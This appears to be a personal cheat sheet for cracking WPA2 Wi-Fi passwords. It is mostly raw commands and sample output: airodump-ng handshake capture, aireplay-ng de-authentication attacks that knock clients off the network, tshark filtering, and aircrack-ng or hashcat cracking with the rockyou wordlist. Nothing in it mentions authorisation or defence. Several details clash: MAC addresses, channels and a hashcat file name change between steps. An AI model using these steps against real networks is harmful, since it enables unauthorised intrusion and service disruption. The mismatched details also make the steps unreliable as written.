### Normal setup

```text
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo iw dev
```
#### Create Monitor Mode Device

```text
sudo ip link set wlan0 down
sudo iw dev wlan0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up					            
```

#### Set channel if needed
```text
iw wlan0mon set channel 7
```

### Check for networks with WPS available
```text
sudo airodump-ng wlan0mon
```
```text
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
30:94:8F:E8:89:5F  -25      240      131    0   6  130   WPA2 CCMP   PSK  linksys

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
30:94:8F:E8:89:5F  E4:84:D3:2E:1F:22  -38    1e- 1e   948      265
```

### Monitor/grab packets and wait for the handshake
```text
airodump-ng -c 6 --bssid 30:94:8F:E8:89:5F -w file wlan0mon
```

### De-auth for a seprate channel to spead up / bute force the handshake
```text
aireplay-ng -0 1 -a 30:94:8F:E8:89:5F -c E4:84:D3:2E:1F:42 wlan0
```

### once handshake has been collected ....


### Review packets captured
```text
aircrack-ng file-01.cap
```
```text
  #  BSSID              ESSID                     Encryption
   1  30:94:8F:E8:89:5F  linksys                WPA (1 handshake)
```

### Tidy up cap file and reduce size
```text
tshark -r file-01.cap -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == 30:94:8F:E8:89:5F" -2 -w out.cap -F pcap
```
### Review output file
```text
aircrack-ng out.cap
```

### Cracking

```text
locate rockyou.txt

aircrack-ng -a2 -b 10:27:F5:66:BE:27 -w rockyou.txt out.cap
```
#### Or a faster way to crack

```text
hcxpcapngtool -o hash.hc22000 -E wordlist out.cap

hashcat -m 22000 hc2200.txt rockyou.txt
```

















